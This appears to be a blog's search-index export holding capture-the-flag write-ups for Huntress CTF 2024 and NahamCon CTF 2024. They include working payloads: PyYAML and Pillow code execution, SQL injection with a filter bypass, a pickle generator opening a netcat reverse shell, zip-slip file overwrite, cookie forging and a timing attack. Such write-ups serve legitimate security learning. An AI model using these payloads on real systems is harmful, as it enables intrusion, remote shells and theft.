[{"categories":["CTF","Web","Scripting"],"content":"PyYAML, ZipSlip, SQLi to pickleRCE, Timing Attack","date":"2024-11-03","objectID":"/huntress-ctf-2024/","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/"},{"categories":["CTF","Web","Scripting"],"content":" Writeups for all web(6/6) and scripting(2/2) challenges. + misc/time-will-tell team: joyuriz points: 3105 rank: 257/3444 ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:0:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#"},{"categories":["CTF","Web","Scripting"],"content":" Web","date":"2024-11-03","objectID":"/huntress-ctf-2024/:0:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#web"},{"categories":["CTF","Web","Scripting"],"content":" Y2J (50 pts)A web application where we can convert Yaml to JSON. I learned the server uses python and by checking headers and looked for vulnerabilities regarding Yaml especially in Python YAML. Searched and found CVE-2020-14343 https://nvd.nist.gov/vuln/detail/CVE-2020-14343 that allowed code execution in PyYAML library. This writeup https://hackmd.io/@harrier/uiuctf20 explains and builds upon the payload. I used this payload to get the flag. !!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ \"open('/flag.txt','r').read()\" ]]] ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:1:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#y2j-50-pts"},{"categories":["CTF","Web","Scripting"],"content":" Plantopia (131 pts)We given a web application with credentials to the login page. Logging in we can observe that session and auth cookies are set as well as other cookies. Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZyaENQ.GHM7nJw9Sk3doUEeOrRuWj4JibI; auth=dGVzdHVzZXIuMC4xNzMwNTgzODIw We can also see there is API documentation but some looks like its for admin. Accessing these endpoints require us to use an Authorization header using the auth cookie set during our login. We can set Authorization: dGVzdHVzZXIuMC4xNzMwNTgzODIw to access the API. which is just base64 encoded from testuser.0.1730583820 Since most of these functionality require admin privileges. I played around and just changed the value from testuser to admin and from 0 to 1. and I successfully accessed the /api/admin/logs From there its just playing around with the admin functionalities. We can see that we can change the commands in the /api/plants/1/edit POST /api/plants/1/edit HTTP/1.1 Host: challenge.ctf.games:32308 Authorization: YWRtaW4uMS4xNzMwNTgzODIw Content-Length: 139 Content-Type: application/json { \"description\": \"A beautiful sunflower.\", \"sunlight_level\": 80, \"watering_threshold\": 50, \"alert_command\": \"cat flag.txt\" } Then we can trigger it via /api/admin/sendmail then view the output in /api/admin/logs ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:2:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#plantopia-131-pts"},{"categories":["CTF","Web","Scripting"],"content":" HelpfulDesk (231 pts)Not going deep into this one. This is duplicate from NahamconCTF https://www.google.com/search?q=nahamconctf+helpfuldesk+writeup There is a /Setup/SetupWizard path if you download and view the source code where you can change the admin credentials and from there we can get the flag. ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:3:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#helpfuldesk-231-pts"},{"categories":["CTF","Web","Scripting"],"content":" PillowFight (338pts)‚ÄúPillowFight uses advanced AI/MLRegressionLearning* to combine two images of your choosing‚Äù Trying out the web application feature we can upload 2 images and combine into /static/combined.png. We can also see that this is Powered by Python Pillow v8.4.0! as seen from the footer. Searching around, I learned it might be vulnerable to https://nvd.nist.gov/vuln/detail/CVE-2022-22817 ‚ÄúPIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method. A lambda expression could also be used.‚Äù We can see that we can also add custom commands from the API documentation This looks like we can pass our own eval command, so I tried working with python code injection payloads and ended up using a standard os command payload to get the flag and write to the /static directory. exec('import os; os.system(\"cat flag.txt\u003e ./static/flag.txt\")') ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:4:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#pillowfight-338pts"},{"categories":["CTF","Web","Scripting"],"content":" MOVEable (376 pts)We can see in the web application a standard login form, no registration. Aside from that we have the source code. What I observed first in the source code is the executeScript under /login route. @app.route('/login', methods=['POST']) def login_user(): username = DBClean(request.form['username']) password = DBClean(request.form['password']) conn = get_db() c = conn.cursor() sql = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\" c.executescript(sql) user = c.fetchone() if user: #... executeScript allows multiple statements https://docs.python.org/3/library/sqlite3.html#sqlite3.Cursor.executescript and will not be able to return any rows so the user will not be able to login regardless if there exists a valid user from the database. Under /download/\u003cfilename\u003e/\u003csessionid\u003e we can see that it just checks if the session exists from the database and we will be able to download the file. @app.route('/download/\u003cfilename\u003e/\u003csessionid\u003e', methods=['GET']) def download_file(filename, sessionid): conn = get_db() c = conn.cursor() c.execute(f\"SELECT * FROM activesessions WHERE sessionid=?\", (sessionid,)) active_session = c.fetchone() if active_session is None: flash('No active session found') return redirect(url_for('home')) c.execute(f\"SELECT data FROM files WHERE filename=?\",(filename,)) file_data = c.fetchone() if file_data is None: flash('File not found') return redirect(url_for('files')) file_blob = pickle.loads(base64.b64decode(file_data[0])) try: return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True) except TypeError: flash(\"ERROR: Failed to retrieve file. Are you trying to hack us?!?\") return redirect(url_for('files')) We can also see in the code that when fetching the file it deserializes it using pickle. So with this information, I solved by doing the following: Adding a valid session to the activesessions table. Adding a pickle RCE payload to the files table. ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:5:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#moveable-376-pts"},{"categories":["CTF","Web","Scripting"],"content":" Adding a valid session to the DBSince we know that the executeScript allows multiple statements. We can add an INSERT after the initial SELECT statement. However we still have to bypass the input sanitation inplaced as the inputs are passed in the DBClean function. def DBClean(string): for bad_char in \" '\\\"\": string = string.replace(bad_char,\"\") return string.replace(\"\\\\\", \"'\") To bypass we can just fill in with comments and backslash \\: -- input INSERT/**/INTO/**/table(col)/**/VALUES(\\val\\) -- is simply INSERT INTO table(col) VALUES('val') We can supply an arbitrary username and add our payload in the password like so. password\\;INSERT/**/INTO/**/activesessions(sessionid)/**/VALUES(1337);-- Note: We can verify if the session is inserted by going to /download/flag.txt/1337. and the error is not ‚ÄúNo active sessions found‚Äù ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:5:1","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#adding-a-valid-session-to-the-db"},{"categories":["CTF","Web","Scripting"],"content":" Exploiting using Pickle RCEI was stuck trying to exfiltrate using boolean based to determine if the database is the same as provided. Once confirmed, I thought that reading a mangled flag.txt is the challenge or trying to read from a different table. Then I noticed that it is using pickle library for files which can be vulnerable to deserialization attacks . Create generic Pickle RCE payload. There are online guides out there but this is generally what it looks like. import pickle, base64 import os, sys class PickleRCE: def __init__(self, payload): self.payload = payload def __reduce__(self): return (os.system, (self.payload,)) def pickle_dump(obj): return base64.b64encode(pickle.dumps(obj)).decode() pickled = PickleRCE(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc {ip} {port} \u003e/tmp/f\") payload = pickle_dump(pickled) print(payload) To add this file on the database, we can just use the previous entry point in the password like in the previous payload inserting into files. password\\;INSERT/**/INTO/**/files(filename,data)/**/VALUES/**/(\\pickle.rce\\,\\gASV....SFlFKULg==\\);-- Setup a listener nc -nvlp \u003cport\u003e To trigger this pickle RCE we just have to navigate to /download/pickle.rce/1337. this depends on the inserted values on the database. Check the listener and well get the shell and find the flag under root. ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:5:2","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#exploiting-using-pickle-rce"},{"categories":["CTF","Web","Scripting"],"content":" Zippy (392 pts)The web applications main functionality is the upload and extraction of ZIP files contents. We can upload zip files in the /Upload and browse directories and filenames under /Browse. Additionally we can observe the backend is asp.net Razor pages when we check the /Logs I searched for File upload attacks regarding zip files and found the zip slip vulnerability and found a guide online https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5 I used this vulnerability to change the code of the Browse.cshtml Razor page that allowed me to view the contents of files in the server. Create (Generate using ChatGPT) a Browse.cshtml that expects file query parameter that outputs the file passed as argument. @page @{ // Get the file name from the query parameter var fileName = Request.Query[\"file\"].ToString(); var filePath = $\"/app/{fileName}\"; string fileContent; // Check if the file exists and read its content if (System.IO.File.Exists(filePath)) { fileContent = System.IO.File.ReadAllText(filePath); } else { fileContent = \"The specified file does not exist.\"; } } \u003ch1\u003eBrowse File Content\u003c/h1\u003e \u003cp\u003e@fileContent\u003c/p\u003e Create malicious browse.zip that will replace the application /app/Pages/Browse.cshtml zip browse.zip ../../../Pages/Browse.cshtml Upload the malicious zip file. Visit the /Browse endpoint and notice the page is replaced with our malicious cshtml file. We can get the flag via?file=flag.txt ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:6:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#zippy-392-pts"},{"categories":["CTF","Web","Scripting"],"content":" Scripting","date":"2024-11-03","objectID":"/huntress-ctf-2024/:0:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#scripting"},{"categories":["CTF","Web","Scripting"],"content":" base64by32 (50 pts)We are given a text file in base64, if we decode the output is still base64. Create a script that can decode it in base64 until it encountered an error import base64 b64 = \"\" with open('base64by32','r') as file: b64 = file.read() while True: try: b64 = base64.b64decode(b64).decode().strip('\\n') print(b64) except Exception as e: print(e) break print(b64) ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:1:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#base64by32-50-pts"},{"categories":["CTF","Web","Scripting"],"content":" Echo Chamber (50 pts)We are given pcap file. If we open it in wireshark and observe the request/responses we can see some repetitive bytes at the end of the packets. First packet shows a repetitive 89 bytes at the end. Succeeding packets shows 89 50 4E indicating that there might be a PNG file being sent. quick reference for magic numbers: https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5 The packets on last bytes when combined will look like this forming the flag. To solve we this, we can create a python script parsing the last few bytes and write it to a PNG file. I utilized https://github.com/KimiNewt/pyshark import pyshark file = \"echo_chamber.pcap\" cap = pyshark.FileCapture(file) hexdump = [] for i, pkt in enumerate(cap): if i % 2: # get the last byte c = pkt[\"icmp\"].data[-2:] hexdump.append(c) hexdump = \"\".join(hexdump) print(hexdump) # write to png byte_data = bytes.fromhex(hexdump) with open(\"flag.png\", 'wb') as file: file.write(byte_data) ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:2:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#echo-chamber-50-pts"},{"categories":["CTF","Web","Scripting"],"content":" Misc","date":"2024-11-03","objectID":"/huntress-ctf-2024/:0:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#misc"},{"categories":["CTF","Web","Scripting"],"content":" Time will tell (241 pts)This is a challenge about trying to guess a randomly generated 8 hexadecimal characters. The important code here is in the check_guess function where it does a do_heavy_compute() if the character from our guess matches with the solution. def check_guess(guess, realdeal) -\u003e bool: \"\"\" validate if the given guess matches what's known \"\"\" if len(guess) != len(realdeal): #print(len(guess), len(realdeal)) return False do_heavy_compute() for idx in range(len(guess)): if guess[idx] == realdeal[idx]: do_heavy_compute() else: return False return True I have read some writeups regarding timing attacks and relying on the delay on responses. Seeing the source code makes it more understandable how these type of attacks work. For more context the do_heavy_compute() function is just set on a time.sleep(0.1) for this challenge. Constructing the solution. First we can start a connection using pwntools and print the first few lines. and send a basic guess. from pwn import * p = remote('challenge.ctf.games', 30390) # initial question lines = p.recvlines(3) for line in lines: print(line) guess = \"12345678\" p.sendlineafter(b':', bytes(guess.encode())) recv = p.recvline() print(\"Guess: \",guess , recv) Since we have a 90 second window to guess, we can run a brute-force by looping through every hex character and observe the response delay using this flow. So if the observed response increased from the previous ones we find the first character. We append the character to the current guess and continue the loop Continue this until we find the correct password We can add this logic to the initial script to brute-force. The brute-force logic would look something like this: password = \"\" max_time = 0.35 print(\"Bruteforcing...\") for _ in range(8): for c in \"0123456789abcdef\": # guess placeholder guess = (password+c).ljust(8,\"_\") # time the response before = time.time() p.sendlineafter(b':', bytes(guess.encode())) recv = p.recvline() after = time.time() print(guess, \":\", recv, after-before) # check if response exceeds the usual time if after-before \u003e max_time: max_time = max_time + 0.1 password = password+c print(\"password:\", password) break recv = p.recvline() print(recv) p.close() Note that for max_time varies on the average connection response. during my tries it looks like the incorrect response would take 0.29 seconds and 0.39 seconds if it is correct. so i set the max_time to 0.35 initially. It is also important to increase max_time as it would increase the delay the more correct characters we have. When we run the script and we can see it started guessing initial character as 3 as the response time increased to 0.38+secs After a while we can see the script works and we find the correct password 38aacb77 and get the flag. ","date":"2024-11-03","objectID":"/huntress-ctf-2024/:1:0","series":null,"tags":["Python","CVE-2020-14343","CVE-2022-22817","Insecure-Deserialization","Command-Injection","Code-Review","SQLi","Filter-Bypass","File-Upload","Timing-Attack"],"title":"Huntress CTF 2024 - writeups","uri":"/huntress-ctf-2024/#time-will-tell-241-pts"},{"categories":["CTF","Web","Scripting"],"content":"WebDav, A lot of Brute-forcing + Wordpress whitebox","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/"},{"categories":["CTF","Web","Scripting"],"content":"Writeups for some web and scripting challenges including the wordpress whitebox challenges team: Cipher Layer points: 2294 rank: 250/2632 ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:0:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#"},{"categories":["CTF","Web","Scripting"],"content":" Web","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:0:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#web"},{"categories":["CTF","Web","Scripting"],"content":" The Davinci Code (50 pts) Uhhh, someone made a Da Vinci Code fan page? But they spelt it wrong, and it looks like the website seems broken‚Ä¶ #webdav This is a challenge relating to WebDav. We can see in the /code path that it returns a error and discloses the flask source code. The base path / with supported methods=['GET', 'PROPFIND'] is shown. Using PROPFIND function and performing directory listing/traversal will lead us to a directory with a flag.txt. We cannot read this directly, but we do know the location of the flag. Knowing about PROPFIND we can fingerprint its probably using webdav and learn above some additional methods like MOVE https://learn.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142926(v=exchg.65). ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:1:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#the-davinci-code-50-pts"},{"categories":["CTF","Web","Scripting"],"content":" Attack Chain GET /code # directory listing / PROPFIND / # we can find /the_secret_dav_inci_codef/flag.txt PROPFIND /the_secret_dav_inci_code # move unaccessible resource to static MOVE /the_secret_dav_inci_code/flag.txt HTTP/1.1 Destination: /static/flag.txt GET /static/flag.txt ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:1:1","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#attack-chain"},{"categories":["CTF","Web","Scripting"],"content":" MOVE the flag ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:1:2","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#move-the-flag"},{"categories":["CTF","Web","Scripting"],"content":" Thomas DEVerson (175 pts) All things considered, I‚Äôm impressed this website is still up and running 200 years later. #flask-session #brute-force Flask session brute-forcing challenge. There is a source code disclosure in /backup revealing the secret_key value which eappends current datetime value to the flask secret. THE_REYNOLDS_PAMPHLET- We are also given available users ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#thomas-deverson-175-pts"},{"categories":["CTF","Web","Scripting"],"content":" /backup Clue when the datetime.now() was initially ran in /status From this we can learn try and generate a valid secret by subtracting current date to the returned output from status. ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:1","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#backup"},{"categories":["CTF","Web","Scripting"],"content":" get_secret.pyI used this script to potentially find the exact value of the secret by subtracting current datetime with the results from /status but did not work. It helped since I got the year and close with the correct value. from datetime import datetime, timedelta import requests import re resp = requests.get(\"http://challenge.nahamcon.com:31915/status\") print(resp.text) match = re.search(r\"(\\d+) days (\\d+) hours (\\d+) minutes\", resp.text) if match: days= int(match.group(1)) hours = int(match.group(2)) minutes = int(match.group(3)) current_date = datetime.now() timedelta_to_subtract = timedelta(days=days, hours=hours, minutes=minutes) resulting_date = current_date - timedelta_to_subtract print(\"Resulting date and time:\", resulting_date) formatted = resulting_date.strftime(\"%Y%m%d%H%M\") secret_key = f'THE_REYNOLDS_PAMPHLET-{formatted}' print(secret_key) output THE_REYNOLDS_PAMPHLET-179708251645. We can try this and forge our own cookie and submit to the /message endpoint but this will not work. flask-unsign --sign --cookie \"{'name': 'Jefferson'}\" --secret 'THE_REYNOLDS_PAMPHLET-179708251645' Since we already know parts of the key and the rest are just datetime integers can just brute-force this since we know its year/month is most likely correct. Worst case brute-force each digit which is not that complex as well. ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:2","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#get_secretpy"},{"categories":["CTF","Web","Scripting"],"content":" brute-force flask key #!/bin/bash for i in {0..99999}; do echo \"THE_REYNOLDS_PAMPHLET-1797082$i\" done \u003e words.txt # brute-force flask session cookie flask-unsign --unsign --cookie \u003c cookie.txt --wordlist words.txt # forge our own session token flask-unsign --sign --cookie \"{'name': 'Jefferson'}\" --secret 'THE_REYNOLDS_PAMPHLET-179708250845' output: eyJuYW1lIjoiSmVmZmVyc29uIn0.ZlDoZA.S5h0UBS1jk8CX4I9P5jCrVsBDOA paste to our session cookie and get the flag ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:3","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#brute-force-flask-key"},{"categories":["CTF","Web","Scripting"],"content":" Secret Info (460 pts)#wordpress #code-review Under Sponsorship category. This is a Whitebox web challenge involving wordpress. Our admin accidentally published some secret images on our site. Unfortunately, somehow we are not able to unpublish the secret image, however, we tried to apply some protection to our site. This should be enough, right? This is a fully white box challenge, almost no heavy brute force is needed. We are provided a wordpress source code with docker file. The only thing here that might be related to the challenge is the test-plugin.php and the flag.png. When we register through browser, we can‚Äôt actually activate our account because our the email service is not working and we can‚Äôt confirm our account and login. There is no way to register through the browser. This is where the feature in the test-plugin.php will be used. ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:3:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#secret-info-460-pts"},{"categories":["CTF","Web","Scripting"],"content":" Registration through admin-ajaxLooking at the test-plugin.php I tried to learn about what this source code and simply asked my friend Chat-GPT define( 'PLUGIN_NAME_PLUGIN_NAME', 'test-plugin' ); define( 'PLUGIN_NAME_VERSION', '1.0.0' ); define( 'PLUGIN_NAME_URL', plugin_dir_url( __FILE__ ) ); define( 'PLUGIN_NAME_PATH', plugin_dir_path( __FILE__ ) ); define( 'PLUGIN_NAME_BASE_DIR', plugin_dir_path( __FILE__ ) ); define( 'PLUGIN_NAME_BASE_NAME', plugin_basename( __FILE__ ) ); add_action(\"wp_ajax_nopriv_register_user\", \"register_user\"); function register_user(){ $username = sanitize_text_field($_POST[\"username\"]); $password = sanitize_text_field($_POST[\"password\"]); $email = sanitize_text_field($_POST[\"email\"]); wp_create_user($username, $password, $email); echo \"user created\"; } The add_action(\"wp_ajax_nopriv_register_user\", \"register_user\"); is an action hook that allows user registration through wp-admin/admin-ajax.php https://developer.wordpress.org/plugins/javascript/ajax/ The request made to admin-ajax.php will look like this We now login through wordpress by using credentials registered through admin-ajax.php ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:3:1","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#registration-through-admin-ajax"},{"categories":["CTF","Web","Scripting"],"content":" Brute-Forcing media contentWe got through dashboard. Now what? I really thought that after getting in the dashboard I could just access the flag in the media files but it seems that i cannot view the media files with my role. I learned media files are available once authenticated and once we know the file name that we are looking for we can just brute-force the /uploads directory year and date. In the Dockerfile we can see the flag.png is renamed to /flag_secret_not_so_random_get_me_1337.png RUN docker-php-ext-install zip RUN docker-php-ext-install gd COPY flag.png /flag_secret_not_so_random_get_me_1337.png COPY plugins/test-plugin /tmp/test-plugin COPY .htaccess /tmp/.htaccess ENTRYPOINT [ \"make\", \"-f\", \"/scripts/Makefile\" ] Using this script, I Brute-forced the flag from the uploads directory import requests base_url = \"http://localhost:8687//wp-content/uploads\" headers = { \"Cookie\": \"\u003cwp-cookies\u003e\" } year = 2024 for month in range(0, 13): if len(str(month)) == 1: month = \"0\" + str(month) url = f\"{base_url}/{year}/{month}/flag_secret_not_so_random_get_me_1337.png\" resp = requests.get(url, headers=headers) print(len(resp.content), url) if \"Page Not Found\" not in resp.text: print(\"Flag URL:\", url) break ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:3:2","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#brute-forcing-media-content"},{"categories":["CTF","Web","Scripting"],"content":" WP Elevator (in-progress)#wordpress #code-review Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don‚Äôt know how it works but will talk with him once he finishes. This is also Wordpress whitebox web Challenge similar to Secret Info. I was able not able to solve this during competition but I want to create writeup. Will be updating once i solve the challenge offline. ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:4:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#wp-elevator-in-progress"},{"categories":["CTF","Web","Scripting"],"content":" Scripting","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:0:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#scripting"},{"categories":["CTF","Web","Scripting"],"content":" Base3200 (50 pts) You know what to do. First thing I did was searched google for some scripts and I instantly found one that solved it. https://gist.github.com/intrd/c63db7bd3d0951f0653d6fdf7ea169d6. This decodes from base64 the provided file 50 times. can also be done through bash by doing cat theflag | base64 -d | base64 -d ... 50 times üëø import base64 pontfile = 'theflag' with open(pontfile, 'r') as f: content = f.read() for _ in range(50): content = base64.b64decode(content) print(content) # flag{340ff1bee05244546c91dea53fba7642} ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:1:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#base3200-50-pts"},{"categories":["CTF","Web","Scripting"],"content":" Hashes on Hashes on Hashes (310 pts)#brute-force #decryption I created a server to manage all my encrypted data from my lucrative ransomware business. It‚Äôs still in development, but I should be okay as long as.. wait, what? Somebody leaked a log file?? We are given the decryption_server.log server.py provided file import socket import base64 from hashlib import md5 from datetime import datetime host = '0.0.0.0' port = 9001 class log: @staticmethod def print(message): with open('./test.log', 'a') as f: now = datetime.now() f.write(now.strftime(\"%d/%m/%Y %H:%M:%S\") + \"\\t\") f.write(message + '\\n') def decrypt(encrypted): key = open('key.txt').read() key = key.strip() log.print(\"Key loaded for encrypted message\") factor = len(encrypted) // len(key) + 1 key = key * factor log.print(f\"Key expanded by factor of {factor}\") key_bytes = key.encode() enc_bytes = base64.b64decode(encrypted) dec_bytes = bytearray() for i in range(len(enc_bytes)): dec_bytes.append(enc_bytes[i] ^ key_bytes[i]) log.print(f\"Partial message digest is {md5(dec_bytes).hexdigest()}\") decrypted = dec_bytes.decode() log.print(\"Message fully decrypted, ready to send...\") return decrypted def main_loop(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((host, port)) log.print(f\"Server listening on host {host} and port {port}\") while True: s.listen(1) log.print(\"Listening for connection...\") c_soc, addr = s.accept() log.print(f\"Connection received from {addr}\") ciphertext = c_soc.recv(1024).decode().strip() log.print(f\"Received encrypted message {ciphertext}\") plaintext = decrypt(ciphertext) c_soc.sendall(plaintext.encode()) log.print(f\"Decrypted message sent!\") if __name__ == '__main__': main_loop() ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:0","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#hashes-on-hashes-on-hashes-310-pts"},{"categories":["CTF","Web","Scripting"],"content":" Message decryption def decrypt(encrypted): key = open('key.txt').read() key = key.strip() log.print(\"Key loaded for encrypted message\") factor = len(encrypted) // len(key) + 1 # matches the key length to the length of base64 encoded text key = key * factor log.print(f\"Key expanded by factor of {factor}\") key_bytes = key.encode() # decrypt from base64 enc_bytes = base64.b64decode(encrypted) dec_bytes = bytearray() for i in range(len(enc_bytes)): # md5(b64decoded XOR key) dec_bytes.append(enc_bytes[i] ^ key_bytes[i]) log.print(f\"Partial message digest is {md5(dec_bytes).hexdigest()}\") decrypted = dec_bytes.decode('utf-8', 'backslashreplace') log.print(\"Message fully decrypted, ready to send...\") return decrypted The message is decrypted with this steps The decrypt function works by accepting a ciphertext (base64 encoded) message. Expand the key by repeating it enough times to match the length of the ciphertext. Decode the ciphertext from base64 and iterate. For each iteration it performs XOR operation between the base64 decoded ciphertext and the key. Both are in bytes. Then converts it to MD5 that we see in the server logs. ","date":"2024-05-29","objectID":"/nahamcon-ctf-2024/:2:1","series":null,"tags":["WebDav","flask","flask Session","Code Review","WordPress","Brute-Force"],"title":"NahamCon CTF 2024 - writeups","uri":"/nahamcon-ctf-2024/#message-decryption"},{"categories":["CTF","Web","Scripting"],"content":" decrypt.pyFor my solution. I just tried iterating all printable ascii characters for the key until it matched the MD5 when XORed into the ciphertext. and then add that character to the known value of the key. This decrypts the captured MD5 and b64 in the log file. 